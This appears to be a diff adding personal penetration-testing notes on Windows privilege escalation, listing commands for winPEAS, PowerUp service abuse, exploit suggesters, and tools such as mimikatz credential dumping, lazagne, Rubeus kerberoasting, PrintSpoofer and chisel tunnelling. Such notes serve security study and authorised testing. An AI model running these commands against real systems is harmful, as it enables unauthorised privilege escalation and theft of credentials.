@@ -1,1 +1,66 @@
+Automatic Checks:
+Winpeas:
+.\winPEASx64.exe serviceinfo
+.\winPEAS.exe quiet servicesinfo
+.\winPEASx64.exe quiet servicesinfo filesinfo userinfo processinfo ← Might get some creds. 
+.\winPEASX64.exe quiet filesinfo userinfo
+.\winPEASany.exe quiet windowscreds ← # Winpeas Enumeration to see if both registry values are set for AlwaysInstallElevated
 
+PowerUp:
+powershell.exe -exec bypass
+. .\PowerUp.ps ← Import module with dot sourcing
+
+Run all checks
+Invoke-AllChecks
+
+Get Services with unquoted service paths
+Get-ServiceUnquoted -verbose
+
+Get services where current user can write to it's binary path
+Get-ModifiableServiceFile -verbose
+
+Get the services which current user can modify
+Get-ModifiableService -verbose
+
+Manipulating and actually abusing service abuse.
+Invoke-ServiceAbuse -Name '<service name>'
+
+Wes.py
+Windows Exploit Suggester
+Gather Kernel Information for last-resort Kernel exploits).From the target first, collect the output of systeminfo command and save in Kali.
+python windows-exploit-suggester.py -u
+python3 ./wes.py -i systeminfo.txt -u *.xls
+
+Getting the info for wes:
+$ systeminfo > systeminfo.txt
+$ python3 /opt/wesng/wes.py --update
+$ python3 /opt/wesng/wes.py --definitions=/opt/wesng/definitions.zip -o vulns.txt systeminfo.txt
+$ python3 /opt/wesng/wes.py --definitions=/opt/wesng/definitions.zip --exploits-only --impact "Elevation of Privilege" --hide "Internet Explorer" Edge Flash -o vulns.txt systeminfo.txt
+$ python3 /opt/wesng/wes.py --exploits-only --impact "Elevation of Privilege" --definitions=/opt/wesng/definitions.zip  systeminfo.txt
+$ cat vulns.txt | cut -d "," -f 2,4,9 | uniq | sort
+
+JAWS
+https://github.com/411Hall/JAWS
+On the target machine:
+$ powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
+$ powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+
+Or PowerShell
+$ .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
+
+Scripts( List)
+accesschk.exe /accepteula -uwdq "C:\Program Files\" ← Check privs with accesschk. 
+winPEASx64.exe 
+PowerUp.ps1
+wes.py ← Collect systeminfo. 
+WindowsEnum.ps1 ← Powershell enumeration script.  
+seatbelt.exe ← Good to check.
+lazagne.exe ← Good to check for random credentials. 
+mimikatz.exe , privilege::debug, sekurlsa::logonpasswords, lsadump::sam
+Rubeus.exe, ← Check for kerberoasting or ASREProasting. 
+SharpHound.ps1 ← Collect json objects for bloodhound and enumerate the AD.
+Bloodhound/neo4j ← Import SharpHound objects into Bloodhound and enumerate visually. 
+PrintSpoofer64.exe -i -c cmd ← SeImpersonate, Godpotato
+Agent.exe ← Pivot and tunnel into the internal network with ligolo or chisel. Chisel for locally listening internal ports, Ligolo for the intial tunnel and scanning, much faster. 
+chisel_1.8.1_windows_amd64
+Responder ← Force authentication  
